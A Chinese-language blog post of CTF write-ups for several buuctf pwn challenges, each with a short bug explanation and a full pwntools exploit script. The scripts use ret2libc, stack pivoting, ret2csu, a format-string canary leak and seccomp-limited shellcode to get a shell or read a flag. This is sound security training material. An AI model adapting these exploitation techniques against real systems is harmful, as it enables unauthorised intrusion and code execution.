---
title: buuctf-pwn write-ups (4)
date: 2023-02-28 22:07:00
categories:
- write-ups
- buuctf 系列
---
# buu032-ez_pz_hackover_2016
```c
int chall()
{
  size_t v0; // eax
  int result; // eax
  char s[1024]; // [esp+Ch] [ebp-40Ch] BYREF
  _BYTE *v3; // [esp+40Ch] [ebp-Ch]

  printf("Yippie, lets crash: %p\n", s);
  printf("Whats your name?\n");
  printf("> ");
  fgets(s, 1023, stdin);
  v0 = strlen(s);
  v3 = memchr(s, 10, v0);                       // 将中间的换行符换成空字节
  if ( v3 )
    *v3 = 0;
  printf("\nWelcome %s!\n", s);
  result = strcmp(s, "crashme");
  if ( !result )
    return vuln((char)s, 0x400u);
  return result;
}
```
chall函数中打印了一个地址，但是没啥用，不给也能做。

本题一个考察的重点就是fgets函数，这个函数遇到换行输入会截断，但是空字节不会，因此可以在crashme后面加一个空字节，后面仍然能输入我们的payload，绕过检查。
![](1.png)
需要注意的是memcpy的src起始地址并不是crashme的地址，而是crashme的二重指针，也就是说复制之后dest的值并不是crashme。这个地址在crashme的前面，因此需要添加的无效字节数量需要经过计算。

exp：
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28953)
elf = ELF('./pwn')

payload = b'crashme\x00'
payload += cyclic(2 + 4*4)
payload += p32(elf.plt['printf'])
payload += p32(elf.symbols['chall'])
payload += p32(elf.got['printf'])

io.sendlineafter(b'> ', payload)

io.recvuntil(b'crashme!\n')
printf = u32(io.recv(4))

print(hex(printf))

libc = LibcSearcher('printf', printf)
base = printf - libc.dump('printf')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = b'crashme\x00'
payload += cyclic(2 + 4*4)
payload += p32(sys)
payload += p32(0xdeadeef)
payload += p32(binsh)

io.sendline(payload)

io.interactive()
```
# buu033-picoctf_2018_rop chain

```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29541)
elf = ELF('./pwn')

payload = cyclic(0x18 + 4)
payload += p32(elf.symbols['win_function1'])
payload += p32(elf.symbols['win_function2']) + p32(elf.symbols['flag'])
payload += p32(0xBAAAAAAD) + p32(0xDEADBAAD)

io.sendlineafter(b'Enter your input> ', payload)

io.interactive()
```
# buu034-[Black Watch 入群题]PWN
bss段给了一大块空间，推测考察栈迁移。
```c
ssize_t vul_function()
{
  size_t v0; // eax
  size_t v1; // eax
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  v0 = strlen(m1);
  write(1, m1, v0);
  read(0, s, 0x200u);
  v1 = strlen(m2);
  write(1, m2, v1);
  return read(0, buf, 0x20u);
}
```
最后一个read的溢出只能覆盖返回地址，因此是栈迁移无疑，将栈转移到bss段。
本题要明确leave指令的作用，其相当于'mov esp, ebp; pop ebp'。我们传入的第一个payload在bss段上，作为伪造的栈区备用；第二个payload中，我们修改了ebp处的值为bss段地址，但此时esp仍然在原来的栈上，不过我们可以将返回地址写到'leave'指令，让程序再一次执行leave指令，由于此时ebp已经被修改为bss段地址，因此此时esp就被成功修改。注意后面的pop ebp指令中pop出来的值已经是bss段上的值了。

在pop之后，esp应指向s+4的位置，这里我们写入write函数读取libc基地址，然后返回到vul_function中，因为vul_function中能够直接在s中写入很多字节，因此就相当于我们直接修改ebp后面的返回地址。将获取的system函数和'/bin/sh'字符串地址写入即可getshell。

```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29191)
elf = ELF('./pwn')

# construct fake stack
payload = p32(elf.symbols['m1'] + 20)
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vul_function'])	# return address, return to function
payload += p32(1)					# first argument of write: stdout
payload += p32(elf.got['write'])	# second argument of write: .got address of 'write'
payload += p32(4)					# third argument of write: write length

io.sendlineafter(b'What is your name?', payload)

payload = cyclic(0x18)
payload += p32(elf.symbols['s'])	# fake ebp
payload += p32(0x8048511)			# return to 'leave; retn' to change rsp into .bss segment

io.sendafter(b'What do you want to say?', payload)

write = u32(io.recv(4))
print(hex(write))
libc = LibcSearcher('write', write)
base = write - libc.dump('write')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

# we can change the stack after ebp directly through 'vul_function'
# now the ebp points to s+8, so fill 12 bytes of garbage into s first
payload = p32(0xdeadbeef) * 3
payload += p32(sys)
payload += p32(0xdeadbeef)
payload += p32(binsh)

io.sendlineafter(b'What is your name?', payload)
io.sendlineafter(b'What do you want to say?', b'Hacked')

# gdb.attach(io)
io.interactive()
```
# buu035-jarvisoj_level4
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26702)
elf = ELF('./pwn')

payload = cyclic(136 + 4)
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vulnerable_function'])
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(4)

io.sendline(payload)

read = u32(io.recv(4))
print(hex(read))
libc = LibcSearcher('read', read)
base = read - libc.dump('read')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(136 + 4)
payload += p32(sys)
payload += p32(0xdeadbeef)
payload += p32(binsh)

io.sendline(payload)

io.interactive()
```
# buu036-jarvisoj_level3_x64
典型的ret2csu，与RopEmporium的最后一题利用方式高度一致。
注意第一个payload里面的0x600890保存的实际是sub rsp,8 ; add rsp,8 ; ret的地址。
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28787)
elf = ELF('./pwn')

# gdb.attach(io)
# sleep(1)

poprdi_ret = 0x4006b3
poprsir15_ret = 0x4006b1
movrdxr13 = 0x400690
pop6_ret = 0x4006aa

payload = cyclic(128 + 8)

payload += p64(pop6_ret)
payload += p64(0)			# rbx
payload += p64(1)			# rbp
payload += p64(0x600890)	# r12
payload += p64(8)			# r13
payload += p64(elf.got['read'])	# r14
payload += p64(0)			# r15

payload += p64(movrdxr13)	# mov rdx, r13; mov rsi, r14; mov edi, r15d
# then call 'pop rdi, ret'
# payload += p64(1)
payload += p64(0) * 7

payload += p64(poprdi_ret)
payload += p64(1)
# at this time, rdi = 1, rsi = addr(got['read']), rdx = 4
payload += p64(elf.plt['write'])
payload += p64(elf.symbols['main'])

io.sendlineafter(b'Input:\n', payload)

read = u64(io.recv(8))

libc = LibcSearcher('read', read)
base = read - libc.dump('read')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(128 + 8)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(sys)

io.sendlineafter(b'Input:\n', payload)

io.interactive()
```
# buu037-bjdctf_2020_babyrop2
用gdb调试发现本题环境中所有函数的canary都相同，于是首先泄露canary然后栈溢出完事。
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

poprdi_ret = 0x400993

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25313)
elf = ELF('./pwn')

io.sendlineafter(b'I\'ll give u some gift to help u!\n', b'%7$llx')

canary = int(io.recv(16), 16)
print(hex(canary))

payload = cyclic(0x18)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['vuln'])

io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts = u64(io.recv(6) + b'\x00\x00')
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x18)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(sys)

io.sendline(payload)

io.interactive()
```
# buu038-pwnable_orw
就是写入shellcode。这道题中有一个seccomp函数，在其中调用了两次prctl函数。具体的功能是禁止用户调用某些系统调用。下面是程序中的片段：
```c
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
```
可以看到调用了两次prctl函数，第一个参数是option，表明具体的功能。[查询linux源码](https://elixir.bootlin.com/linux/v5.17.10/source/include/uapi/linux/prctl.h#L68)可知，选项22和38分别代表以下意思：
```c
#define PR_SET_SECCOMP	22
#define PR_SET_NO_NEW_PRIVS	38
```
38表示禁止提权，而22则为设定SECCOMP保护。
当prctl第一个参数为22时，实际上调用了prctl_set_seccomp函数。找到其定义：
```c
long prctl_set_seccomp(unsigned long seccomp_mode, void __user *filter)
{
	unsigned int op;
	void __user *uargs;

	switch (seccomp_mode) {
	case SECCOMP_MODE_STRICT:
		op = SECCOMP_SET_MODE_STRICT;
		/*
		 * Setting strict mode through prctl always ignored filter,
		 * so make sure it is always NULL here to pass the internal
		 * check in do_seccomp().
		 */
		uargs = NULL;
		break;
	case SECCOMP_MODE_FILTER:
		op = SECCOMP_SET_MODE_FILTER;
		uargs = filter;
		break;
	default:
		return -EINVAL;
	}

	/* prctl interface doesn't have flags, so they are always zero. */
	return do_seccomp(op, 0, uargs);
}
```
其中switch的宏定义如下：
```c
#define SECCOMP_MODE_DISABLED	0 /* seccomp is not in use. */
#define SECCOMP_MODE_STRICT	1 /* uses hard-coded filter. */
#define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. */
```
程序中传入的第二个参数为2，表示seccomp为过滤器模式。
之后查看源码发现传入的参数为一个结构体，内含长度与指令，指令用于seccomp沙箱。也就是说seccomp最终的执行方式是一种沙箱（vm）。直接手动分析可能较为困难，但有工具seccomp-tools帮助我们分析这些并输出结果（[安装方法](https://blog.csdn.net/am_03/article/details/119870152?ops_request_misc=&request_id=&biz_id=102&utm_term=seccomp-tools&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-119870152.142^v13^control,157^v14^control&spm=1018.2226.3001.4187)）

![](2.png)
可以看到输出把允许的系统调用用绿色标了出来，允许open、read、write。因此直接用open打开flag文件，读取若干字节到某个地址之后再写出来就可以了。这里选择将数据写在栈上，简单方便。

其中使用到了三个系统调用，32位x86的系统调用号以及使用的参数表在[这里](https://blog.csdn.net/Nashi_Ko/article/details/120288385?spm=1001.2014.3001.5506)查询

exp：
```python
from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27084)

payload = 'push 0x0;'			# string ends
payload += 'push 0x67616c66;'	# string 'flag'
payload += 'mov ebx,esp;'		# second argument of syscall 'open'
payload += 'mov eax,5;'			# syscall code 5: open
payload += 'xor ecx,ecx;'
payload += 'xor edx,edx;'
payload += 'int 0x80;'			# open file './flag'

payload += 'mov eax,3;'			# syscall code 3: read
payload += 'mov ecx,ebx;'		# read file './flag' to stack (ebx==esp now)
payload += 'mov ebx,3;'			# fd, 0 => stdin, 1 => stdout, 2 => stderr, >=3 => others
payload += 'mov edx,0x100;'		# readsize, choose 0x100
payload += 'int 0x80;'			# read file './flag'

payload += 'mov eax,4;'			# syscall code 4: write
payload += 'mov ecx,esp;'
payload += 'mov ebx,1;'			# second argument of syscall 'write': fd for stdout
payload += 'mov edx,0x100;'		# write size, choose 0x100
payload += 'int 0x80;'			# syscall code 4: write

print(asm(payload))
io.sendlineafter(b'Give my your shellcode:', asm(payload))
io.interactive()
```
